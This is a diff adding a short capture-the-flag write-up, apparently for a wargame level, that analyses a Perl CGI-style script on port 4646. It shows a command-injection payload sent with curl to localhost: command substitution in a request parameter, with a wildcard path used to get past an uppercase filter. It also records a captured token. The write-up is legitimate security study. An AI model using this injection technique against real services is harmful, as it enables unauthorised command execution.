@@ -1,0 +1,17 @@
+1. cat the perl scripting file, we can have below infor:
+  the scripting is open a port 4646 which we can accees from localhost network
+2. there is 2 functions
+  function n, it use the result of a call to function t as argument
+  function t, it take 2 argumrnts, it does some opration with the first argument
+  there is two regex. first one, change all the letters to upppercase, second one remove all the spaces , https://regex101.com/ is handy when we are not sure what means for a regex
+  egrep is like grep with e means expand to regular expression
+  the arguments passing to t is taking from the params we pass to the network request
+3.we try to pass a shell command to params, we can't pass getflag directly like that, as it will be translated to GETFLAG, we can passing a shell scriping with a uppercase file in tmp, ex, named LEVEL12
+#!/bin/sh
+
+getflag > /tmp/flag12
+4. we can't run /tmp/LEVE12 as tmp will also be translated to TMP, we can use wild card *
+5. curl 'localhost:4646?x=$(/*/LEVEL12)'
+6. cat /tmp/flag12
+  g1qKMiRpXf53AWhDaU7FEkczr got the token
+  
